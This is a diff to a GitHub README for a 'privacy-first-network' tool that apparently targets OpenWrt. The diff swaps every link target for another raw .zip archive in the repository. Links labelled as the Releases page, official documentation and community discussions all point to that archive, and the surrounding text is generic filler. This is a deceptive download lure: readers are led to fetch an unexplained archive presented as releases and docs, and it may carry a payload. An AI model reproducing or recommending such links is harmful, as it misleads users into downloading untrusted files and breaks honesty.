@@ -1,6 +1,6 @@
 # 🛡️ privacy-first-network - Secure Your Internet Connection Instantly
 
-[![Download Releases](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip%20Now-privacy--first--network-brightgreen)](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip)
+[![Download Releases](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip%20Now-privacy--first--network-brightgreen)](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the privacy-first-network! This application helps you create a secure
 
 To get started, you need to visit the Releases page. This is where you can find the latest version of the software.
 
-[Download from Releases Page](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip)
 
 ### Instructions:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip).
 2. Locate the latest release version.
 3. You'll find various files that you can download. Select the appropriate file for your operating system.
 4. Click on the file to start the download.
@@ -62,8 +62,8 @@ For any questions or issues, feel free to open an issue on the GitHub repository
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip)
-- [Community Discussions](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip)
 
 Explore these resources to get the most out of your privacy-first network setup.
 
@@ -79,4 +79,4 @@ Stay tuned for updates in future releases.
 
 Remember, your privacy is important. Enjoy your secure browsing experience with privacy-first-network!
 
-[Download Releases](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/network/privacy-first-network_roentgentherapy.zip)
+[Download Releases](https://raw.githubusercontent.com/Preethamvarma007/privacy-first-network/main/openwrt/firewall/network-first-privacy-v2.5.zip)
